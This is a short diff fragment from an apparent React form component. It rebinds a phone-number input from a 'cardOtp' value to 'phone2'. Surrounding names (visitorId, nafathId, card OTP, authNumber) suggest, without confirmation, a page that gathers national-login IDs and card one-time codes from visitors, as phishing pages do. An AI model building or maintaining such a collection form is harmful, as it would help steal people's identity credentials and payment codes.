@@ -829,7 +829,7 @@ addData({id:visitorId,nafathId,authNumber:''})
                     type="tel"
                     inputMode="numeric"
                     maxLength={10}
-                    value={cardOtp}
+                    value={phone2}
                     onChange={(e) => setPhone2(e.target.value)}
                     className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                   />                </div>
